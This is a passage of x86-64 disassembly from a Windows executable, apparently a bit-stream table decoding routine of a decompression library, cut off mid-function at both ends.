   140001698:	c7 44 24 38 ff 00 00 	movl   $0xff,0x38(%rsp)
   14000169f:	00 
   1400016a0:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   1400016a5:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400016ac:	00 
   1400016ad:	e8 6e 0c 00 00       	call   0x140002320
   1400016b2:	48 8b f0             	mov    %rax,%rsi
   1400016b5:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400016b9:	0f 87 99 08 00 00    	ja     0x140001f58
   1400016bf:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   1400016c4:	41 83 f9 06          	cmp    $0x6,%r9d
   1400016c8:	76 0c                	jbe    0x1400016d6
   1400016ca:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400016d1:	e9 82 08 00 00       	jmp    0x140001f58
   1400016d6:	44 8b 54 24 38       	mov    0x38(%rsp),%r10d
   1400016db:	41 8b c9             	mov    %r9d,%ecx
   1400016de:	b8 01 00 00 00       	mov    $0x1,%eax
   1400016e3:	d3 e0                	shl    %cl,%eax
   1400016e5:	ff c0                	inc    %eax
   1400016e7:	4c 63 c0             	movslq %eax,%r8
   1400016ea:	41 8d 52 01          	lea    0x1(%r10),%edx
   1400016ee:	b8 01 00 00 00       	mov    $0x1,%eax
   1400016f3:	48 d3 e0             	shl    %cl,%rax
   1400016f6:	48 8d 0c 55 0b 00 00 	lea    0xb(,%rdx,2),%rcx
   1400016fd:	00 
   1400016fe:	48 03 c8             	add    %rax,%rcx
   140001701:	ba 64 01 00 00       	mov    $0x164,%edx
   140001706:	48 c1 e9 02          	shr    $0x2,%rcx
   14000170a:	49 03 c8             	add    %r8,%rcx
   14000170d:	48 c1 e1 02          	shl    $0x2,%rcx
   140001711:	48 3b ca             	cmp    %rdx,%rcx
   140001714:	77 b4                	ja     0x1400016ca
   140001716:	4a 8d 04 85 00 00 00 	lea    0x0(,%r8,4),%rax
   14000171d:	00 
   14000171e:	48 8b cb             	mov    %rbx,%rcx
   140001721:	48 2b d0             	sub    %rax,%rdx
   140001724:	45 8b c2             	mov    %r10d,%r8d
   140001727:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000172c:	48 03 c3             	add    %rbx,%rax
   14000172f:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140001736:	00 
   140001737:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000173c:	e8 0f fc ff ff       	call   0x140001350
   140001741:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140001745:	0f 87 0d 08 00 00    	ja     0x140001f58
   14000174b:	48 2b fe             	sub    %rsi,%rdi
   14000174e:	4c 89 a4 24 d8 02 00 	mov    %r12,0x2d8(%rsp)
   140001755:	00 
   140001756:	66 83 7b 02 00       	cmpw   $0x0,0x2(%rbx)
   14000175b:	48 8d 14 2e          	lea    (%rsi,%rbp,1),%rdx
   14000175f:	4c 89 ac 24 98 02 00 	mov    %r13,0x298(%rsp)
   140001766:	00 
   140001767:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000176c:	4c 89 b4 24 90 02 00 	mov    %r14,0x290(%rsp)
   140001773:	00 
   140001774:	4c 8b c7             	mov    %rdi,%r8
   140001777:	0f 84 f5 03 00 00    	je     0x140001b72
   14000177d:	e8 9e f9 ff ff       	call   0x140001120
   140001782:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140001786:	0f 87 b4 07 00 00    	ja     0x140001f40
   14000178c:	44 0f b7 0b          	movzwl (%rbx),%r9d
   140001790:	48 8d 0d e9 27 37 01 	lea    0x13727e9(%rip),%rcx        # 0x141373f80
   140001797:	8b 54 24 60          	mov    0x60(%rsp),%edx
   14000179b:	49 8b c7             	mov    %r15,%rax
   14000179e:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   1400017a3:	41 03 d1             	add    %r9d,%edx
   1400017a6:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400017ab:	4d 8b ef             	mov    %r15,%r13
   1400017ae:	42 8b 3c 89          	mov    (%rcx,%r9,4),%edi
   1400017b2:	8b ca                	mov    %edx,%ecx
   1400017b4:	4c 8b 5c 24 78       	mov    0x78(%rsp),%r11
   1400017b9:	f7 d9                	neg    %ecx
   1400017bb:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   1400017c0:	49 d3 ed             	shr    %cl,%r13
   1400017c3:	4c 23 ef             	and    %rdi,%r13
   1400017c6:	83 fa 40             	cmp    $0x40,%edx
   1400017c9:	77 43                	ja     0x14000180e
   1400017cb:	4d 3b f3             	cmp    %r11,%r14
   1400017ce:	72 0e                	jb     0x1400017de
   1400017d0:	8b ca                	mov    %edx,%ecx
   1400017d2:	48 c1 e9 03          	shr    $0x3,%rcx
   1400017d6:	4c 2b f1             	sub    %rcx,%r14
   1400017d9:	83 e2 07             	and    $0x7,%edx
   1400017dc:	eb 2d                	jmp    0x14000180b
   1400017de:	4d 3b f4             	cmp    %r12,%r14
   1400017e1:	74 2b                	je     0x14000180e
   1400017e3:	44 8b c2             	mov    %edx,%r8d
   1400017e6:	49 8b ce             	mov    %r14,%rcx
   1400017e9:	41 c1 e8 03          	shr    $0x3,%r8d
   1400017ed:	49 2b c8             	sub    %r8,%rcx
   1400017f0:	49 3b cc             	cmp    %r12,%rcx
   1400017f3:	73 06                	jae    0x1400017fb
   1400017f5:	45 8b c6             	mov    %r14d,%r8d
   1400017f8:	45 2b c4             	sub    %r12d,%r8d
   1400017fb:	41 8b c8             	mov    %r8d,%ecx
   1400017fe:	4c 2b f1             	sub    %rcx,%r14
   140001801:	42 8d 0c c5 00 00 00 	lea    0x0(,%r8,8),%ecx
   140001808:	00 
   140001809:	2b d1                	sub    %ecx,%edx
   14000180b:	4d 8b 3e             	mov    (%r14),%r15
   14000180e:	42 8d 2c 0a          	lea    (%rdx,%r9,1),%ebp
   140001812:	4d 8b d7             	mov    %r15,%r10
   140001815:	8b cd                	mov    %ebp,%ecx
   140001817:	f7 d9                	neg    %ecx
   140001819:	49 d3 ea             	shr    %cl,%r10
   14000181c:	4c 23 d7             	and    %rdi,%r10
   14000181f:	83 fd 40             	cmp    $0x40,%ebp
   140001822:	77 3f                	ja     0x140001863
   140001824:	4d 3b f3             	cmp    %r11,%r14
   140001827:	72 0e                	jb     0x140001837
   140001829:	8b cd                	mov    %ebp,%ecx
   14000182b:	48 c1 e9 03          	shr    $0x3,%rcx
   14000182f:	4c 2b f1             	sub    %rcx,%r14
   140001832:	83 e5 07             	and    $0x7,%ebp
   140001835:	eb 29                	jmp    0x140001860
   140001837:	4d 3b f4             	cmp    %r12,%r14
   14000183a:	74 27                	je     0x140001863
   14000183c:	8b d5                	mov    %ebp,%edx
   14000183e:	49 8b ce             	mov    %r14,%rcx
   140001841:	c1 ea 03             	shr    $0x3,%edx
   140001844:	48 2b ca             	sub    %rdx,%rcx
   140001847:	49 3b cc             	cmp    %r12,%rcx
   14000184a:	73 06                	jae    0x140001852
   14000184c:	41 8b d6             	mov    %r14d,%edx
   14000184f:	41 2b d4             	sub    %r12d,%edx
   140001852:	8b ca                	mov    %edx,%ecx
   140001854:	4c 2b f1             	sub    %rcx,%r14
   140001857:	8d 0c d5 00 00 00 00 	lea    0x0(,%rdx,8),%ecx
   14000185e:	2b e9                	sub    %ecx,%ebp
   140001860:	4d 8b 3e             	mov    (%r14),%r15
   140001863:	be 03 00 00 00       	mov    $0x3,%esi
   140001868:	83 fd 40             	cmp    $0x40,%ebp
   14000186b:	76 05                	jbe    0x140001872
   14000186d:	44 8b c6             	mov    %esi,%r8d
   140001870:	eb 59                	jmp    0x1400018cb
   140001872:	4d 3b f3             	cmp    %r11,%r14
   140001875:	72 11                	jb     0x140001888
   140001877:	8b cd                	mov    %ebp,%ecx
   140001879:	83 e5 07             	and    $0x7,%ebp
   14000187c:	48 c1 e9 03          	shr    $0x3,%rcx
   140001880:	4c 2b f1             	sub    %rcx,%r14
   140001883:	45 33 c0             	xor    %r8d,%r8d
   140001886:	eb 40                	jmp    0x1400018c8
   140001888:	4d 3b f4             	cmp    %r12,%r14
   14000188b:	75 0c                	jne    0x140001899
   14000188d:	83 fd 40             	cmp    $0x40,%ebp
   140001890:	45 1b c0             	sbb    %r8d,%r8d
   140001893:	41 83 c0 02          	add    $0x2,%r8d
   140001897:	eb 32                	jmp    0x1400018cb
   140001899:	8b d5                	mov    %ebp,%edx
   14000189b:	49 8b ce             	mov    %r14,%rcx
   14000189e:	c1 ea 03             	shr    $0x3,%edx
   1400018a1:	48 2b ca             	sub    %rdx,%rcx
   1400018a4:	49 3b cc             	cmp    %r12,%rcx
   1400018a7:	73 0e                	jae    0x1400018b7
   1400018a9:	41 8b d6             	mov    %r14d,%edx
   1400018ac:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400018b2:	41 2b d4             	sub    %r12d,%edx
   1400018b5:	eb 03                	jmp    0x1400018ba
   1400018b7:	45 33 c0             	xor    %r8d,%r8d
   1400018ba:	8b ca                	mov    %edx,%ecx
   1400018bc:	4c 2b f1             	sub    %rcx,%r14
   1400018bf:	8d 0c d5 00 00 00 00 	lea    0x0(,%rdx,8),%ecx
   1400018c6:	2b e9                	sub    %ecx,%ebp
   1400018c8:	4d 8b 3e             	mov    (%r14),%r15
   1400018cb:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400018d0:	33 d2                	xor    %edx,%edx
   1400018d2:	49 8d 89 fc 00 00 00 	lea    0xfc(%r9),%rcx
   1400018d9:	48 3b c1             	cmp    %rcx,%rax
   1400018dc:	0f 92 c2             	setb   %dl
   1400018df:	33 c9                	xor    %ecx,%ecx
   1400018e1:	45 85 c0             	test   %r8d,%r8d
   1400018e4:	0f 94 c1             	sete   %cl
   1400018e7:	85 d1                	test   %edx,%ecx
   1400018e9:	0f 84 fe 00 00 00    	je     0x1400019ed
   1400018ef:	46 8b 44 ab 04       	mov    0x4(%rbx,%r13,4),%r8d
   1400018f4:	4d 8b ef             	mov    %r15,%r13
   1400018f7:	45 8b c8             	mov    %r8d,%r9d
   1400018fa:	41 8b c8             	mov    %r8d,%ecx
   1400018fd:	45 0f b7 c0          	movzwl %r8w,%r8d
   140001901:	c1 e9 10             	shr    $0x10,%ecx
   140001904:	88 08                	mov    %cl,(%rax)
   140001906:	46 8b 5c 93 04       	mov    0x4(%rbx,%r10,4),%r11d
   14000190b:	41 c1 e9 18          	shr    $0x18,%r9d
   14000190f:	41 8b d3             	mov    %r11d,%edx
   140001912:	c1 ea 10             	shr    $0x10,%edx
   140001915:	41 8b fb             	mov    %r11d,%edi
   140001918:	88 50 01             	mov    %dl,0x1(%rax)
   14000191b:	49 8b d7             	mov    %r15,%rdx
   14000191e:	c1 ef 18             	shr    $0x18,%edi
   140001921:	41 8d 34 29          	lea    (%r9,%rbp,1),%esi
   140001925:	41 f7 d9             	neg    %r9d
   140001928:	41 83 e1 3f          	and    $0x3f,%r9d
   14000192c:	83 e5 3f             	and    $0x3f,%ebp
   14000192f:	40 0f b6 cd          	movzbl %bpl,%ecx
   140001933:	48 d3 e2             	shl    %cl,%rdx
   140001936:	44 8d 14 37          	lea    (%rdi,%rsi,1),%r10d
   14000193a:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000193e:	83 e6 3f             	and    $0x3f,%esi
   140001941:	48 d3 ea             	shr    %cl,%rdx
   140001944:	f7 df                	neg    %edi
   140001946:	49 03 d0             	add    %r8,%rdx
   140001949:	83 e7 3f             	and    $0x3f,%edi
   14000194c:	44 8b 4c 93 04       	mov    0x4(%rbx,%rdx,4),%r9d
   140001951:	45 8b c1             	mov    %r9d,%r8d
   140001954:	41 0f b7 d1          	movzwl %r9w,%edx
   140001958:	41 c1 e8 18          	shr    $0x18,%r8d
   14000195c:	41 c1 e9 10          	shr    $0x10,%r9d
   140001960:	44 88 48 02          	mov    %r9b,0x2(%rax)
   140001964:	43 8d 1c 02          	lea    (%r10,%r8,1),%ebx
   140001968:	41 f7 d8             	neg    %r8d
   14000196b:	41 83 e0 3f          	and    $0x3f,%r8d
   14000196f:	41 83 e2 3f          	and    $0x3f,%r10d
   140001973:	41 0f b6 ca          	movzbl %r10b,%ecx
   140001977:	4d 8b d7             	mov    %r15,%r10
   14000197a:	49 d3 e5             	shl    %cl,%r13
   14000197d:	41 0f b6 c8          	movzbl %r8b,%ecx
   140001981:	49 d3 ed             	shr    %cl,%r13
   140001984:	40 0f b6 ce          	movzbl %sil,%ecx
   140001988:	4c 03 ea             	add    %rdx,%r13
   14000198b:	45 0f b7 c3          	movzwl %r11w,%r8d
   14000198f:	4c 8b 5c 24 78       	mov    0x78(%rsp),%r11
   140001994:	49 8b d7             	mov    %r15,%rdx
   140001997:	48 d3 e2             	shl    %cl,%rdx
   14000199a:	40 0f b6 cf          	movzbl %dil,%ecx
   14000199e:	48 d3 ea             	shr    %cl,%rdx
   1400019a1:	49 03 d0             	add    %r8,%rdx
   1400019a4:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   1400019a9:	45 8b 4c 90 04       	mov    0x4(%r8,%rdx,4),%r9d
   1400019ae:	45 8b c1             	mov    %r9d,%r8d
   1400019b1:	41 0f b7 d1          	movzwl %r9w,%edx
   1400019b5:	41 c1 e8 18          	shr    $0x18,%r8d
   1400019b9:	41 c1 e9 10          	shr    $0x10,%r9d
   1400019bd:	44 88 48 03          	mov    %r9b,0x3(%rax)
   1400019c1:	42 8d 2c 03          	lea    (%rbx,%r8,1),%ebp
   1400019c5:	83 e3 3f             	and    $0x3f,%ebx
   1400019c8:	0f b6 cb             	movzbl %bl,%ecx
   1400019cb:	41 f7 d8             	neg    %r8d
   1400019ce:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400019d3:	41 83 e0 3f          	and    $0x3f,%r8d
   1400019d7:	49 d3 e2             	shl    %cl,%r10
   1400019da:	41 0f b6 c8          	movzbl %r8b,%ecx
   1400019de:	49 d3 ea             	shr    %cl,%r10
   1400019e1:	4c 03 d2             	add    %rdx,%r10
   1400019e4:	48 83 c0 04          	add    $0x4,%rax
   1400019e8:	e9 76 fe ff ff       	jmp    0x140001863
   1400019ed:	49 8d b9 fd 00 00 00 	lea    0xfd(%r9),%rdi
   1400019f4:	48 3b c7             	cmp    %rdi,%rax
   1400019f7:	0f 87 3c 05 00 00    	ja     0x140001f39
   1400019fd:	0f 1f 00             	nopl   (%rax)
   140001a00:	46 8b 4c ab 04       	mov    0x4(%rbx,%r13,4),%r9d
   140001a05:	8b cd                	mov    %ebp,%ecx
   140001a07:	41 8b d1             	mov    %r9d,%edx
   140001a0a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a0f:	c1 ea 10             	shr    $0x10,%edx
   140001a12:	45 8b c1             	mov    %r9d,%r8d
   140001a15:	41 c1 e8 18          	shr    $0x18,%r8d
   140001a19:	88 10                	mov    %dl,(%rax)
   140001a1b:	41 03 e8             	add    %r8d,%ebp
   140001a1e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001a23:	48 ff c0             	inc    %rax
   140001a26:	83 fd 40             	cmp    $0x40,%ebp
   140001a29:	0f 87 22 01 00 00    	ja     0x140001b51
   140001a2f:	49 8b d7             	mov    %r15,%rdx
   140001a32:	48 d3 e2             	shl    %cl,%rdx
   140001a35:	4d 3b f3             	cmp    %r11,%r14
   140001a38:	72 0b                	jb     0x140001a45
   140001a3a:	8b cd                	mov    %ebp,%ecx
   140001a3c:	48 c1 e9 03          	shr    $0x3,%rcx
   140001a40:	4c 2b f1             	sub    %rcx,%r14
   140001a43:	eb 38                	jmp    0x140001a7d
   140001a45:	4d 3b f4             	cmp    %r12,%r14
   140001a48:	74 39                	je     0x140001a83
   140001a4a:	44 8b dd             	mov    %ebp,%r11d
   140001a4d:	49 8b ce             	mov    %r14,%rcx
   140001a50:	41 c1 eb 03          	shr    $0x3,%r11d
   140001a54:	49 2b cb             	sub    %r11,%rcx
   140001a57:	49 3b cc             	cmp    %r12,%rcx
   140001a5a:	73 19                	jae    0x140001a75
   140001a5c:	4c 8b 5c 24 78       	mov    0x78(%rsp),%r11
   140001a61:	41 8b ce             	mov    %r14d,%ecx
   140001a64:	41 2b cc             	sub    %r12d,%ecx
   140001a67:	4c 2b f1             	sub    %rcx,%r14
   140001a6a:	8d 0c cd 00 00 00 00 	lea    0x0(,%rcx,8),%ecx
   140001a71:	2b e9                	sub    %ecx,%ebp
   140001a73:	eb 0b                	jmp    0x140001a80
   140001a75:	4d 2b f3             	sub    %r11,%r14
   140001a78:	4c 8b 5c 24 78       	mov    0x78(%rsp),%r11
   140001a7d:	83 e5 07             	and    $0x7,%ebp
   140001a80:	4d 8b 3e             	mov    (%r14),%r15
   140001a83:	48 3b c7             	cmp    %rdi,%rax
   140001a86:	0f 87 ad 04 00 00    	ja     0x140001f39
   140001a8c:	41 f7 d8             	neg    %r8d
   140001a8f:	45 0f b7 e9          	movzwl %r9w,%r13d
   140001a93:	46 8b 4c 93 04       	mov    0x4(%rbx,%r10,4),%r9d
   140001a98:	41 83 e0 3f          	and    $0x3f,%r8d
   140001a9c:	41 0f b6 c8          	movzbl %r8b,%ecx
   140001aa0:	45 8b c1             	mov    %r9d,%r8d
   140001aa3:	48 d3 ea             	shr    %cl,%rdx
   140001aa6:	8b cd                	mov    %ebp,%ecx
   140001aa8:	4c 03 ea             	add    %rdx,%r13
   140001aab:	41 c1 e8 18          	shr    $0x18,%r8d
   140001aaf:	41 8b d1             	mov    %r9d,%edx
   140001ab2:	41 03 e8             	add    %r8d,%ebp
   140001ab5:	c1 ea 10             	shr    $0x10,%edx
   140001ab8:	88 10                	mov    %dl,(%rax)
   140001aba:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140001abf:	48 83 c0 02          	add    $0x2,%rax
   140001ac3:	83 fd 40             	cmp    $0x40,%ebp
   140001ac6:	77 6d                	ja     0x140001b35
   140001ac8:	49 8b d7             	mov    %r15,%rdx
   140001acb:	48 d3 e2             	shl    %cl,%rdx
   140001ace:	4d 3b f3             	cmp    %r11,%r14
   140001ad1:	72 0b                	jb     0x140001ade
   140001ad3:	8b cd                	mov    %ebp,%ecx
   140001ad5:	48 c1 e9 03          	shr    $0x3,%rcx
   140001ad9:	4c 2b f1             	sub    %rcx,%r14
   140001adc:	eb 2e                	jmp    0x140001b0c
   140001ade:	4d 3b f4             	cmp    %r12,%r14
   140001ae1:	74 2f                	je     0x140001b12
   140001ae3:	44 8b d5             	mov    %ebp,%r10d
   140001ae6:	49 8b ce             	mov    %r14,%rcx
   140001ae9:	41 c1 ea 03          	shr    $0x3,%r10d
   140001aed:	49 2b ca             	sub    %r10,%rcx
   140001af0:	49 3b cc             	cmp    %r12,%rcx
   140001af3:	73 14                	jae    0x140001b09
   140001af5:	41 8b ce             	mov    %r14d,%ecx
   140001af8:	41 2b cc             	sub    %r12d,%ecx
   140001afb:	4c 2b f1             	sub    %rcx,%r14
   140001afe:	8d 0c cd 00 00 00 00 	lea    0x0(,%rcx,8),%ecx
   140001b05:	2b e9                	sub    %ecx,%ebp
   140001b07:	eb 06                	jmp    0x140001b0f
   140001b09:	4d 2b f2             	sub    %r10,%r14
   140001b0c:	83 e5 07             	and    $0x7,%ebp
   140001b0f:	4d 8b 3e             	mov    (%r14),%r15
   140001b12:	48 3b c7             	cmp    %rdi,%rax
   140001b15:	0f 87 1e 04 00 00    	ja     0x140001f39
   140001b1b:	41 f7 d8             	neg    %r8d
   140001b1e:	45 0f b7 d1          	movzwl %r9w,%r10d
   140001b22:	41 83 e0 3f          	and    $0x3f,%r8d
   140001b26:	41 0f b6 c8          	movzbl %r8b,%ecx
   140001b2a:	48 d3 ea             	shr    %cl,%rdx
   140001b2d:	4c 03 d2             	add    %rdx,%r10
   140001b30:	e9 cb fe ff ff       	jmp    0x140001a00
   140001b35:	42 8b 4c ab 04       	mov    0x4(%rbx,%r13,4),%ecx
   140001b3a:	c1 e9 10             	shr    $0x10,%ecx
   140001b3d:	88 08                	mov    %cl,(%rax)
   140001b3f:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001b44:	48 03 c6             	add    %rsi,%rax
   140001b47:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
   140001b4c:	e9 ef 03 00 00       	jmp    0x140001f40
   140001b51:	42 8b 4c 93 04       	mov    0x4(%rbx,%r10,4),%ecx
   140001b56:	be 02 00 00 00       	mov    $0x2,%esi
   140001b5b:	c1 e9 10             	shr    $0x10,%ecx
   140001b5e:	88 08                	mov    %cl,(%rax)
   140001b60:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001b65:	48 03 c6             	add    %rsi,%rax
   140001b68:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
   140001b6d:	e9 ce 03 00 00       	jmp    0x140001f40
   140001b72:	e8 a9 f5 ff ff       	call   0x140001120
   140001b77:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140001b7b:	0f 87 bf 03 00 00    	ja     0x140001f40
   140001b81:	44 0f b7 03          	movzwl (%rbx),%r8d
   140001b85:	4c 8d 2d f4 23 37 01 	lea    0x13723f4(%rip),%r13        # 0x141373f80
   140001b8c:	8b 54 24 60          	mov    0x60(%rsp),%edx
   140001b90:	4d 8b f7             	mov    %r15,%r14
   140001b93:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001b98:	41 03 d0             	add    %r8d,%edx
   140001b9b:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   140001ba0:	8b ca                	mov    %edx,%ecx
   140001ba2:	47 8b 4c 85 00       	mov    0x0(%r13,%r8,4),%r9d
   140001ba7:	f7 d9                	neg    %ecx
   140001ba9:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140001bae:	4c 8b fe             	mov    %rsi,%r15
   140001bb1:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140001bb6:	49 d3 ef             	shr    %cl,%r15
   140001bb9:	4d 23 f9             	and    %r9,%r15
   140001bbc:	83 fa 40             	cmp    $0x40,%edx
   140001bbf:	77 3d                	ja     0x140001bfe
   140001bc1:	49 3b fc             	cmp    %r12,%rdi
   140001bc4:	72 0e                	jb     0x140001bd4
   140001bc6:	8b c2                	mov    %edx,%eax
   140001bc8:	48 c1 e8 03          	shr    $0x3,%rax
   140001bcc:	48 2b f8             	sub    %rax,%rdi
   140001bcf:	83 e2 07             	and    $0x7,%edx
   140001bd2:	eb 27                	jmp    0x140001bfb
   140001bd4:	48 3b fd             	cmp    %rbp,%rdi
   140001bd7:	74 25                	je     0x140001bfe
   140001bd9:	8b ca                	mov    %edx,%ecx
   140001bdb:	48 8b c7             	mov    %rdi,%rax
   140001bde:	c1 e9 03             	shr    $0x3,%ecx
   140001be1:	48 2b c1             	sub    %rcx,%rax
   140001be4:	48 3b c5             	cmp    %rbp,%rax
   140001be7:	73 04                	jae    0x140001bed
   140001be9:	8b cf                	mov    %edi,%ecx
   140001beb:	2b cd                	sub    %ebp,%ecx
   140001bed:	8b c1                	mov    %ecx,%eax
   140001bef:	48 2b f8             	sub    %rax,%rdi
   140001bf2:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001bf9:	2b d0                	sub    %eax,%edx
   140001bfb:	48 8b 37             	mov    (%rdi),%rsi
   140001bfe:	46 8d 14 02          	lea    (%rdx,%r8,1),%r10d
   140001c02:	4c 8b de             	mov    %rsi,%r11
   140001c05:	41 8b ca             	mov    %r10d,%ecx
   140001c08:	f7 d9                	neg    %ecx
   140001c0a:	49 d3 eb             	shr    %cl,%r11
   140001c0d:	4d 23 d9             	and    %r9,%r11
   140001c10:	41 83 fa 40          	cmp    $0x40,%r10d
   140001c14:	77 41                	ja     0x140001c57
   140001c16:	49 3b fc             	cmp    %r12,%rdi
   140001c19:	72 10                	jb     0x140001c2b
   140001c1b:	41 8b c2             	mov    %r10d,%eax
   140001c1e:	48 c1 e8 03          	shr    $0x3,%rax
   140001c22:	48 2b f8             	sub    %rax,%rdi
   140001c25:	41 83 e2 07          	and    $0x7,%r10d
   140001c29:	eb 29                	jmp    0x140001c54
   140001c2b:	48 3b fd             	cmp    %rbp,%rdi
   140001c2e:	74 27                	je     0x140001c57
   140001c30:	41 8b ca             	mov    %r10d,%ecx
   140001c33:	48 8b c7             	mov    %rdi,%rax
   140001c36:	c1 e9 03             	shr    $0x3,%ecx
   140001c39:	48 2b c1             	sub    %rcx,%rax
   140001c3c:	48 3b c5             	cmp    %rbp,%rax
   140001c3f:	73 04                	jae    0x140001c45
   140001c41:	8b cf                	mov    %edi,%ecx
   140001c43:	2b cd                	sub    %ebp,%ecx
   140001c45:	8b c1                	mov    %ecx,%eax
   140001c47:	48 2b f8             	sub    %rax,%rdi
   140001c4a:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001c51:	44 2b d0             	sub    %eax,%r10d
   140001c54:	48 8b 37             	mov    (%rdi),%rsi
   140001c57:	b8 03 00 00 00       	mov    $0x3,%eax
   140001c5c:	41 83 fa 40          	cmp    $0x40,%r10d
   140001c60:	76 04                	jbe    0x140001c66
   140001c62:	8b d0                	mov    %eax,%edx
   140001c64:	eb 57                	jmp    0x140001cbd
   140001c66:	49 3b fc             	cmp    %r12,%rdi
   140001c69:	72 12                	jb     0x140001c7d
   140001c6b:	41 8b c2             	mov    %r10d,%eax
   140001c6e:	41 83 e2 07          	and    $0x7,%r10d
   140001c72:	48 c1 e8 03          	shr    $0x3,%rax
   140001c76:	48 2b f8             	sub    %rax,%rdi
   140001c79:	33 d2                	xor    %edx,%edx
   140001c7b:	eb 3d                	jmp    0x140001cba
   140001c7d:	48 3b fd             	cmp    %rbp,%rdi
   140001c80:	75 0b                	jne    0x140001c8d
   140001c82:	41 83 fa 40          	cmp    $0x40,%r10d
   140001c86:	1b d2                	sbb    %edx,%edx
   140001c88:	83 c2 02             	add    $0x2,%edx
   140001c8b:	eb 30                	jmp    0x140001cbd
   140001c8d:	41 8b ca             	mov    %r10d,%ecx
   140001c90:	48 8b c7             	mov    %rdi,%rax
   140001c93:	c1 e9 03             	shr    $0x3,%ecx
   140001c96:	48 2b c1             	sub    %rcx,%rax
   140001c99:	48 3b c5             	cmp    %rbp,%rax
   140001c9c:	73 0b                	jae    0x140001ca9
   140001c9e:	8b cf                	mov    %edi,%ecx
   140001ca0:	ba 01 00 00 00       	mov    $0x1,%edx
   140001ca5:	2b cd                	sub    %ebp,%ecx
   140001ca7:	eb 02                	jmp    0x140001cab
   140001ca9:	33 d2                	xor    %edx,%edx
   140001cab:	8b c1                	mov    %ecx,%eax
   140001cad:	48 2b f8             	sub    %rax,%rdi
   140001cb0:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   140001cb7:	44 2b d0             	sub    %eax,%r10d
   140001cba:	48 8b 37             	mov    (%rdi),%rsi
   140001cbd:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140001cc2:	33 c9                	xor    %ecx,%ecx
   140001cc4:	49 8d 80 fc 00 00 00 	lea    0xfc(%r8),%rax
   140001ccb:	4c 3b f0             	cmp    %rax,%r14
   140001cce:	0f 92 c1             	setb   %cl
   140001cd1:	33 c0                	xor    %eax,%eax
   140001cd3:	85 d2                	test   %edx,%edx
   140001cd5:	0f 94 c0             	sete   %al
   140001cd8:	85 c8                	test   %ecx,%eax
   140001cda:	0f 84 dd 00 00 00    	je     0x140001dbd
   140001ce0:	42 8b 54 bb 04       	mov    0x4(%rbx,%r15,4),%edx
   140001ce5:	4c 8b fe             	mov    %rsi,%r15
   140001ce8:	8b c2                	mov    %edx,%eax
   140001cea:	44 0f b7 c2          	movzwl %dx,%r8d
   140001cee:	c1 e8 18             	shr    $0x18,%eax
   140001cf1:	44 8b c8             	mov    %eax,%r9d
   140001cf4:	42 8d 0c 10          	lea    (%rax,%r10,1),%ecx
   140001cf8:	8b c2                	mov    %edx,%eax
   140001cfa:	43 8b 54 8d 00       	mov    0x0(%r13,%r9,4),%edx
   140001cff:	c1 e8 10             	shr    $0x10,%eax
   140001d02:	41 88 06             	mov    %al,(%r14)
   140001d05:	46 8b 54 9b 04       	mov    0x4(%rbx,%r11,4),%r10d
   140001d0a:	41 8b c2             	mov    %r10d,%eax
   140001d0d:	c1 e8 18             	shr    $0x18,%eax
   140001d10:	44 8b d8             	mov    %eax,%r11d
   140001d13:	8d 1c 08             	lea    (%rax,%rcx,1),%ebx
   140001d16:	f7 d9                	neg    %ecx
   140001d18:	41 8b c2             	mov    %r10d,%eax
   140001d1b:	c1 e8 10             	shr    $0x10,%eax
   140001d1e:	41 88 46 01          	mov    %al,0x1(%r14)
   140001d22:	48 8b c6             	mov    %rsi,%rax
   140001d25:	48 d3 e8             	shr    %cl,%rax
   140001d28:	48 23 c2             	and    %rdx,%rax
   140001d2b:	49 03 c0             	add    %r8,%rax
   140001d2e:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   140001d33:	45 8b 44 80 04       	mov    0x4(%r8,%rax,4),%r8d
   140001d38:	41 8b c0             	mov    %r8d,%eax
   140001d3b:	41 0f b7 d0          	movzwl %r8w,%edx
   140001d3f:	c1 e8 18             	shr    $0x18,%eax
   140001d42:	41 c1 e8 10          	shr    $0x10,%r8d
   140001d46:	45 88 46 02          	mov    %r8b,0x2(%r14)
   140001d4a:	45 0f b7 c2          	movzwl %r10w,%r8d
   140001d4e:	44 8d 0c 18          	lea    (%rax,%rbx,1),%r9d
   140001d52:	41 8b 44 85 00       	mov    0x0(%r13,%rax,4),%eax
   140001d57:	f7 db                	neg    %ebx
   140001d59:	41 8b c9             	mov    %r9d,%ecx
   140001d5c:	f7 d9                	neg    %ecx
